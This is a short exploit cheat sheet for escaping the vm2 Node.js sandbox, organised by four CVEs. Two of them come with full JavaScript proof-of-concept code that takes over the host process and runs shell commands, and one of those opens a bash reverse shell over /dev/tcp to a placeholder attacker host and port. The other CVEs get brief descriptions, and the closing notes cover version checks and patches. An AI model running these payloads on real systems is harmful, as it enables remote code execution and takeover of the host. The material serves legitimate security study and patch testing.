# vm2 Node.js Sandbox Escape

Multiple CVEs break out of the vm2 sandbox. All result in arbitrary code execution in the host Node.js process.

## CVE-2023-32314 — Error.name Proxy (vm2 ≤ 3.9.17)

```javascript
const { VM } = require("vm2");
const vm = new VM();
vm.run(`
  const err = new Error();
  err.name = {
    toString: new Proxy(() => {}, {
      apply(target, thiz, args) {
        const process = args.constructor.constructor('return process')();
        throw process.mainModule.require('child_process').execSync('id').toString();
      }
    })
  };
  try { err.stack; } catch(e) { e; }
`);
```

## CVE-2023-30547 — Stack Overflow via Proxy (vm2 ≤ 3.9.16)

Triggers stack overflow in exception handler via deeply nested Proxy, escaping to host context.

## CVE-2023-37903 — Symbol.for nodejs.util.inspect.custom

```javascript
const { VM } = require("vm2");
const vm = new VM();
vm.run(`
  let host_process;
  const handler = {
    get(target, key) {
      if (key === Symbol.for('nodejs.util.inspect.custom')) {
        return function() {
          host_process = arguments[2].stylize.constructor.constructor('return process')();
        };
      }
      return target[key];
    }
  };
  const obj = new Proxy({}, handler);
  require('util').inspect(obj);
  host_process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"');
`);
```

## CVE-2023-37466 — Promise Constructor Species

Abuses Promise constructor's `Symbol.species` to escape the sandbox.

## Notes

- Check `npm list vm2` to identify version
- All these CVEs are patched in vm2 3.9.19+; vm2 is now deprecated
- Shell executes as the Node.js process user
